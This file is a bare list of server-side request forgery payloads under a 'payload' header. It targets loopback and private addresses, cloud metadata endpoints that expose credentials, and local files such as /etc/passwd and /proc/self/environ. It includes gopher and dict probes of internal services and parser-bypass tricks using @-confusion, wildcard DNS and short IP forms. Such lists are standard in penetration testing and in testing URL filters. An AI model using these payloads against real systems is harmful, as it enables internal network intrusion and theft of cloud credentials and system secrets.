payload
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:22
http://0.0.0.0
http://0.0.0.0:80
http://localhost
http://localhost:80
http://localhost/admin
http://[::1]
http://[::1]:80
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/computeMetadata
http://169.254.169.254/metadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
file:///etc/passwd
file:///proc/self/environ
ftp://127.0.0.1
dict://127.0.0.1:80/
dict://localhost:80/
gopher://127.0.0.1:6379/_PING
gopher://127.0.0.1/
gopher://localhost/
http://169.254.169.254/
http://10.0.0.1
http://10.0.0.2
http://192.168.0.1
http://192.168.1.1
http://192.168.100.1
http://172.16.0.1
http://172.17.0.1
http://172.31.255.255
http://aws.amazon.com@169.254.169.254/latest/meta-data/
http://169.254.169.254.xip.io/
http://127.0.0.1.nip.io/
http://localhost.nip.io/
http://example.com@127.0.0.1
http://evil.com@169.254.169.254/
http://localhost#@evil.com
http://127.1
http://0
http://0000::1
